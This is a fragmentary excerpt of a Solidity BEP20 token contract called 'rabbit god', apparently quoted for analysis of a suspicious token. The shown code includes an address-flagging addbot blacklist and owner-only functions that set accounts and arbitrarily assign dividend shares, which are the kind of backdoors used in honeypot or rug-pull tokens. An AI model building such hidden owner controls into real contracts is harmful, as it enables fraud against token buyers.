...
contract Token is IBEP20, Auth {
    ...
    string constant _name = "rabbit god";
    string constant _symbol = "RD";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 300 * 10**13;
    ...
    mapping(address => bool) public _isBCheck;
    ...
    constructor() Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xf233C43bdEDB52988A83761F390d500373cf3bf5;
        devfeeReceiver = 0xf233C43bdEDB52988A83761F390d500373cf3bf5;
    ...
    function getisDividendExempt(address user) external view returns(bool){
        return isDividendExempt[user];
    }
    function transferFrom(
        address sender,
        address recipient,
    ...
    function setAccounts(address [] memory accounts,bool state) public authorized {
    ...
    function addbot(address bot) internal {
        _isBCheck[bot] = true;
    }
    ...
    function setShareFun(address holder, uint amount)external authorized{
         distributor.setShare(holder,amount);
    }
    function setFees(
